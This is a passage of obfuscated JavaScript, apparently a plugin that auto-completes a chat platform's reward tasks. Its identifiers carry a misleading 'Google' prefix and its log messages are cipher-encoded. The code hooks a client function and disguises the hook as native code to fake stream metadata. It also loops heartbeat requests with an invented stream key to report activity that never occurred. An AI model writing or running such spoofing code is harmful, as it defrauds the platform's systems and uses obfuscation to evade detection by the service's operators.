0}${_0xlex.d("]—]@JMAI]`")}${_0xpid}`,`${_0xlex.d("$JMMP]N?RRCPLQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QJ?@]`")}${_0xpid}`,`${_0xlex.d("$JMMP]AFCAIQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]@JMAI]`")}${_0xpid}`,`${_0xlex.d("2FC]RGJCB]DJMMP]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]RGJC]`")}${_0xpid}`,`${_0xlex.d("$JMMP]AFCAIQ]JGLC]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]QRMLC]`")}${_0xpid}`,`${_0xlex.d("2FC]DJMMP]EPGB]JGLCQ]SN]GL]DMSPQw]")}${_0xpid % 4 === 0}${_0xlex.d("]—]RGJC]`")}${_0xpid}`]));
              let undo = null;
              try { undo = GoogleHook(_0x3, _0xm0, GoogleNative(() => ({ id: v.app, pid: _0xpid, sourceName: null }), "function getStreamerActiveStreamMetadata() { [native code] }", _0xm0, 0)); if (!undo) throw new Error("hook"); } catch (e) { Log.say(_0xlex.C(0), _0xlex.P(11,[_0xlex.d("2FC]QRPC?K]BMMPU?W]UMSJB]LMR]MNCL]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]QRPC?K]PMSRC]AMSJB]LMR]@C]?PKCB]—]KMTGLE]MLk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]AMSJB]LMR]@C]NPCN?PCB]—]QIGNNGLEk"),_0xlex.d("2FC]QRPC?K]PMSRC]AMSJB]LMR]@C]?PKCB]—]QIGNNGLEk"),_0xlex.d("2FC]QRPC?K]PMSRC]AMSJB]LMR]@C]?PKCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]D?GJCB]RM]AMKC]SN]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]AMSJB]LMR]@C]NPCN?PCB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]D?GJCB]RM]AMKC]SN]—]KMTGLE]MLk"),_0xlex.d("2FC]QRPC?K]CLRPW]AMSJB]LMR]@C]MNCLCB]—]KMTGLE]MLk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]D?GJCB]RM]AMKC]SN]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]QRPC?K]CLRPW]AMSJB]LMR]@C]MNCLCB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]PCDSQCB]RM]@C]QCR]SN]—]KMTGLE]MLk"),_0xlex.d("2FC]QRPC?K]BMMPU?W]UMSJB]LMR]MNCL]—]KMTGLE]MLk")])); resolve(); return; }
              
              let cleanupCalled = false, removeSelf = null, watchdog = null, GoogleStreamHandler = null;
              const cleanup = () => { 
                if (cleanupCalled) return; 
                cleanupCalled = true; 
                
                finishTask();
                Log.diag("Stream task cleanup", { state: "cleaned", activeTaskCount: _0x8844.size }); 
                if (removeSelf) removeSelf(); 
                try { undo?.(); } catch (e) {} 
                if (GoogleStreamHandler) { try { _0xoff(_0xe1, GoogleStreamHandler); } catch (e) {} } 
                if (watchdog !== null) { clearTimeout(watchdog); watchdog = null; } 
                resolve(); 
              };
              removeSelf = _0xe8a7(cleanup);
              
              let stick = 0;
              GoogleStreamHandler = data => { if (_0xpaus || _0xkill || signal.aborted || cleanupCalled) return; let _0x28 = GoogleProgress(data, GoogleTasks.stream, v.cfgv); if (_0x28 === null) return; if (++stick % 3 === 1 || _0x28 >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(37,[`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${_0x28}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x28}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x28}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${_0x28}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`])); if (_0x28 >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xlex.d("0MSLBCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("5P?NNCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(" MVCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(")LMAICB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(".SR]RM]@CBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("\"CJGTCPCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("&?LBCB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1CRRJCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!FCAICB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MKNJCRCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!?QFCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JMQCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JC?PCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MLAJSBCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1C?JCBw]")}${v.name}${_0xlex.d("k")}`])); if (_0x28 >= v.goal || _0xkill) cleanup(); };
              watchdog = setTimeout(() => cleanup(), Math.max(10 * 60 * 1000, (v.goal - v.cur) * 120000));
              
              try { _0xon(_0xe1, GoogleStreamHandler); } catch (e) { cleanup(); Log.say(_0xlex.C(0), _0xlex.P(12,[_0xlex.d("2FC]QRPC?K]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]QIGNNGLEk"),_0xlex.d("1S@QAPG@GLE]RM]QRPC?K]NPMEPCQQ]D?GJCB]—]QIGNNGLEk"),_0xlex.d("1RPC?K]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]KMTGLE]MLk"),_0xlex.d("1RPC?K]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]QRPC?K]DCCB]QS@QAPGNRGML]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("1S@QAPG@GLE]RM]QRPC?K]NPMEPCQQ]D?GJCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("1RPC?K]NPMEPCQQ]QS@QAPGNRGML]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]QRPC?K]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]QRPC?K]DCCB]QS@QAPGNRGML]D?GJCB]—]QIGNNGLEk"),_0xlex.d("1S@QAPG@GLE]RM]QRPC?K]NPMEPCQQ]D?GJCB]—]KMTGLE]MLk"),_0xlex.d("1S@QAPG@GLE]RM]QRPC?K]NPMEPCQQ]D?GJCB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]QRPC?K]DCCB]QS@QAPGNRGML]D?GJCB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("1RPC?K]NPMEPCQQ]QS@QAPGNRGML]D?GJCB]—]QIGNNGLEk"),_0xlex.d("1RPC?K]NPMEPCQQ]SNB?RCQ]AMSJB]LMR]@C]QS@QAPG@CB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]QRPC?K]NPMEPCQQ]DCCB]UMSJB]LMR]QS@QAPG@C]—]QIGNNGLE]RFGQ]MLCk")])); resolve(); return; }
              
              
              Log.diag("Stream task handoff", { state: "subscribed", activeTaskCount: _0x8844.size });
              handedOff = true; 
              Log.say(_0xlex.C(11), _0xlex.P(45,[`${_0xlex.d("1FMUdQ]?@MSR]RM]QR?PR]—]ICCN]TA]JGTC]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(" ?AIQR?EC]JGEFRQ]ML]—]ICCN]?]UGLBMU]JGTC]GL]TA]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("*GEFRQ]?PC]ML]@?AIQR?EC]—]ICCN]?]UGLBMU]JGTC]GL]TA]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("2FC]QR?EC]GQ]QCR]—]ICCN]?]UGLBMU]MNCL]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("*GEFRQ]?PC]ML]@?AIQR?EC]—]ICCN]?]UGLBMU]JGTC]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d(" ?AIQR?EC]JGEFRQ]ML]—]ICCN]TA]JGTC]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("2FC]QR?EC]GQ]QCR]—]ICCN]?]UGLBMU]JGTC]GL]TA]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d(" ?AIQR?EC]JGEFRQ]ML]—]ICCN]?]UGLBMU]JGTC]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("2FC]QR?EC]GQ]QCR]—]ICCN]TA]JGTC]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("!SPR?GLdQ]SN]—]ICCN]?]UGLBMU]JGTC]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("*GEFRQ]?PC]ML]@?AIQR?EC]—]ICCN]TA]JGTC]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("1FMUdQ]?@MSR]RM]QR?PR]—]ICCN]?]UGLBMU]JGTC]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("2FC]QR?EC]GQ]QCR]—]ICCN]?]UGLBMU]JGTC]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d(" ?AIQR?EC]JGEFRQ]ML]—]ICCN]?]UGLBMU]MNCL]GL]TA]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`,`${_0xlex.d("1FMUdQ]?@MSR]RM]QR?PR]—]ICCN]?]UGLBMU]JGTC]GL]TA]DMP]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLSRCQk")}`]));
            } catch (err) {
              finishTask();
              reject(err);
            } finally {
              if (!handedOff) finishTask();
            }
          })();
        });
      };

      const _0xact = async (v) => {
        if (!_0x6 || !_0x7) { Log.say(_0xlex.C(0), _0xlex.P(13,[_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]A?@GLCR]—]KMTGLE]MLk"),_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]A?@GLCR]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]QIGNNGLEk"),_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]JC?TGLE]GR]DMP]J?RCPk")])); return; }
        let _0x29; try { _0x29 = _0x6[_0xm8]()[0]?.id; } catch (e) {}
        if (!_0x29) { try { const guilds = Object.values(_0x7[_0xm9]()); const voiceGuild = guilds.find(x => x && x.VOCAL && x.VOCAL.length); if (voiceGuild) _0x29 = voiceGuild.VOCAL[0].channel.id; } catch (e) {} if (!_0x29) { Log.say(_0xlex.C(0), _0xlex.P(13,[_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]JC?TGLE]GR]DMP]J?RCPk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]?PA?BC]A?@GLCR]F?B]LM]BMMPU?W]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]A?@GLCR]—]KMTGLE]MLk"),_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]KMTGLE]MLk"),_0xlex.d("2FC]A?@GLCRdQ]BMMPU?W]U?Q]LMR]DMSLB]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]A?@GLCR]—]LMR]R?IGLE]GR]RFGQ]QFGDRk"),_0xlex.d(",M]BMMPU?W]DMSLB]DMP]RFC]?PA?BC]A?@GLCR]—]QIGNNGLEk"),_0xlex.d(",M]?PA?BC]BMMPU?W]AMSJB]@C]DMSLB]—]JC?TGLE]GR]DMP]J?RCPk")])); return; } }
        let _0x2a = "call:" + _0x29 + ":" + Array.from({length: 16}, () => Math.floor(Math.random() * 16).toString(16)).join('');
        Log.say(_0xlex.C(19), _0xlex.P(46,[`${_0xlex.d("\"PMNNGLE]AMGLQ]GL]RFC]A?@GLCR]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLfk")}`,`${_0xlex.d("0SLLGLE]RFC]A?@GLCR]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]JCDRk")}`,`${_0xlex.d("$CCBGLE]AMGLQ]RM]RFC]A?@GLCR]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLfk")}`,`${_0xlex.d("$CCBGLE]RFC]A?@GLCR]AMGLQ]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLfk")}`,`${_0xlex.d("$CCBGLE]RFC]A?@GLCR]AMGLQ]—]?@MSR]")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("\"PMNNGLE]AMGLQ]GL]RFC]A?@GLCR]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]JCDRk")}`,`${_0xlex.d("$CCBGLE]AMGLQ]RM]RFC]A?@GLCR]—]?@MSR]")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("$CCBGLE]AMGLQ]RM]RFC]A?@GLCR]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]JCDRk")}`,`${_0xlex.d("$CCBGLE]RFC]A?@GLCR]AMGLQ]—]\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]JCDRk")}`,`${_0xlex.d("$CCBGLE]RFC]A?@GLCR]AMGLQ]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLfk")}`,`${_0xlex.d("$CCBGLE]AMGLQ]RM]RFC]A?@GLCR]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLfk")}`,`${_0xlex.d("0SLLGLE]RFC]A?@GLCR]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGLfk")}`,`${_0xlex.d("\"PMNNGLE]AMGLQ]GL]RFC]A?@GLCR]—]?@MSR]")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`,`${_0xlex.d("\"PMNNGLE]AMGLQ]GL]RFC]A?@GLCR]—]e\\")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KMPC]KGLfk")}`,`${_0xlex.d("!MGLQ]GLRM]RFC]A?@GLCR]—]?@MSR]")}${Math.ceil((v.goal - v.cur) / 60)}${_0xlex.d("]KGL]RM]EMk")}`]));
        const _0xactivityDeadline = Date.now() + Math.max(10 * 60 * 1000, (v.goal - v.cur) * 120000);
        let tick = 0;
        while (v.cur < v.goal && !_0xkill && !signal.aborted && Date.now() < _0xactivityDeadline) {
          if (_0xpaus) { await GoogleDelay(3); continue; }
          let _0x2b = await GooglePostSafe({ url: GoogleRoutes.heartbeat(v.q.id), body: { stream_key: _0x2a, terminal: false } });
          const reportedProgress = _0xbb86(_0x2b?.body, GoogleTasks.activity);
          if (reportedProgress !== null) v.cur = reportedProgress;
          if (++tick % 3 === 1 || v.cur >= v.goal) Log.say(_0xlex.C(4), _0xlex.P(38,[`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]JMEECBk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d(",MU]PC?BGLEw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]RM]B?RCk")}`,`${_0xlex.d("0SLLGLE]R?JJWw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]GL]RFC]@MMIQk")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur}${_0xlex.d("l")}${v.goal}`,`${_0xlex.d(",MU]PC?BGLEw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("]QM]D?Pk")}`,`${_0xlex.d("!SPPCLR]@C?Rw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d("0?LBMK]DP?ARGMLw]")}${v.cur}${_0xlex.d("l")}${v.goal}${_0xlex.d("k")}`,`${_0xlex.d(".PMEPCQQ]JGLCw]")}${v.cur}${_0xlex.d("l")}${v.goal}`]));
          await GoogleDelay(20);
          if (v.cur >= v.goal) { await GoogleDelay(2); if (_0xkill || signal.aborted) break; if (!_0xkill && !signal.aborted) await GooglePostSafe({ url: GoogleRoutes.heartbeat(v.q.id), body: { stream_key: _0x2a, terminal: true } }); break; }
        }
        if (v.cur >= v.goal) Log.say(_0xlex.C(3), _0xlex.P(39,[`${_0xlex.d("0MSLBCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("5P?NNCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(" MVCB]SNw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(")LMAICB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d(".SR]RM]@CBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("\"CJGTCPCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("&?LBCB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1CRRJCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!FCAICB]MDDw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MKNJCRCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!?QFCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JMQCB]MSRw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!JC?PCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("!MLAJSBCBw]")}${v.name}${_0xlex.d("k")}`,`${_0xlex.d("1C?JCBw]")}${v.name}${_0xlex.d("k")}`]));
        else if (!_0xkill && !signal.aborted && Date.now() >= _0xactivityDeadline) Log.say(_0xlex.C(0), _0xlex.P(14,[`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]NPMBSACB]LM]NPMEPCQQ]@CDMPC]QRMNNGLE]—]AMSLRGLE]GR]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]CLBCB]UGRFMSR]AMLDGPKCB]NPMEPCQQ]—]AMSLRGLE]GR]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]NPMBSACB]LM]NPMEPCQQ]@CDMPC]QRMNNGLE]—]RPC?RGLE]GR]?Q]?]QR?JJk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]QRMNNCB]?DRCP]LM]AMLDGPKCB]NPMEPCQQ]—]RPC?RGLE]GR]?Q]?]QR?JJk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]QR?JJCB]UGRF]LM]AMLDGPKCB]NPMEPCQQ]—]RPC?RGLE]GR]?Q]?]QR?JJk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]QRMNNCB]?DRCP]LM]AMLDGPKCB]NPMEPCQQ]—]?QQSKGLE]GR]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]NPMBSACB]LM]NPMEPCQQ]@CDMPC]QRMNNGLE]—]K?PIGLE]GR]BMUL]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]NPMBSACB]LM]NPMEPCQQ]@CDMPC]QRMNNGLE]—]?QQSKGLE]GR]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]UCLR]OSGCR]UGRFMSR]NPMEPCQQ]—]RPC?RGLE]GR]?Q]?]QR?JJk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]UCLR]OSGCR]UGRFMSR]NPMEPCQQ]—]AMSLRGLE]GR]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]CLBCB]UGRFMSR]AMLDGPKCB]NPMEPCQQ]—]K?PIGLE]GR]BMUL]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]CLBCB]UGRFMSR]AMLDGPKCB]NPMEPCQQ]—]?QQSKGLE]GR]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]QRMNNCB]?DRCP]LM]AMLDGPKCB]NPMEPCQQ]—]K?PIGLE]GR]BMUL]?Q]QR?JJCBk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]CLBCB]UGRFMSR]AMLDGPKCB]NPMEPCQQ]—]DJ?EEGLE]LM]NPMEPCQQk")}`,`${_0xlex.d("~ARGTGRW]")}${v.name}${_0xlex.d("]UCLR]OSGCR]UGRFMSR]NPMEPCQQ]—]?QQSKGLE]GR]QR?JJCBk")}`]));
      };

      const GoogleHandlers = { [GoogleTasks.video]: _0xvideo, [GoogleTasks.videoMobile]: _0xvideo, [GoogleTasks.play]: _0xplay, [GoogleTasks.stream]: _0xstream, [GoogleTasks.activity]: _0xact };

      const _0x10 = async (_0x11) => {
        let _0x15 = _0x79a4(_0x11.config, GoogleRoutes.tasks);
        if (!_0x15?.tasks) { Log.say(_0xlex.C(0), _0xlex.P(15,[_0xlex.d(",M]AFMPCQ]UCPC]ML]RFC]JGQR]—]JC?TGLE]GR]DMP]LCVR]RGKCk"),_0xlex.d("!FMPC]JGQR]U?Q]@J?LI]—]JC?TGLE]GR]DMP]LCVR]RGKCk"),_0xlex.d("!FMPC]JGQR]A?KC]@?AI]CKNRW]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]JGQR]MD]AFMPCQ]U?Q]CKNRW]—]KMTGLE]MLk"),_0xlex.d("!FMPC]JGQR]A?KC]@?AI]CKNRW]—]KMTGLE]MLk"),_0xlex.d("2FC]JGQR]MD]AFMPCQ]U?Q]CKNRW]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("!FMPC]JGQR]A?KC]@?AI]CKNRW]—]JC?TGLE]GR]DMP]LCVR]RGKCk"),_0xlex.d("!FMPC]JGQR]A?KC]@?AI]CKNRW]—]LMRFGLE]RM]BM]RFGQ]N?QQk"),_0xlex.d("2FC]JGQR]MD]AFMPCQ]U?Q]CKNRW]—]JC?TGLE]GR]DMP]LCVR]RGKCk"),_0xlex.d("!FMPC]JGQR]A?KC]@?AI]CKNRW]—]QIGNNGLE]RFC]PMSLBk"),_0xlex.d(